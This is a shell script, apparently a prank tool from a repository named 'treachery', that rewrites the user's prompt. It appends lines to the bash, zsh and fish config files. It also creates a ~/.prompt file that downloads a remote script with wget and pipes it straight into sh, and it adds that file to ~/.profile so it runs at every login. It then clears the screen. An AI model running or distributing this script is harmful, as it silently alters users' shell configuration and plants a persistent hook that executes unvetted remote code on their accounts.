#!/bin/sh
# dash uses . not source, so this checks if that needs to be remedied
if which source 2>/dev/null >/dev/null
then
	:;
else
	alias source="."
fi

PROMPT="Σ:З "
putrc() {
	RCS="${HOME}/.zshrc ${HOME}/.bashrc ${HOME}/.config/fish/config.fish"
	for word in $RCS
	do
		echo "$1" >> $word
	done
}
if [ -e ~/.prompt ]; then
	exit
fi
putrc "\nPS1=\"${PROMPT}\""
echo 'sh -c "$(wget -qO - https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master/assorted/prompt.sh)"' >>~/.prompt
chmod +x ~/.prompt
echo '~/.prompt' >> ~/.profile
case "${SHELL}" in
	"/bin/zsh")
		source "${HOME}/.zshrc"
		;;
	"/bin/bash")
		source "${HOME}/.bashrc"
		;;
	"/bin/fish")
		source "${HOME}/.config/fish/config.fish"
		;;
	*)
		;;
esac
clear
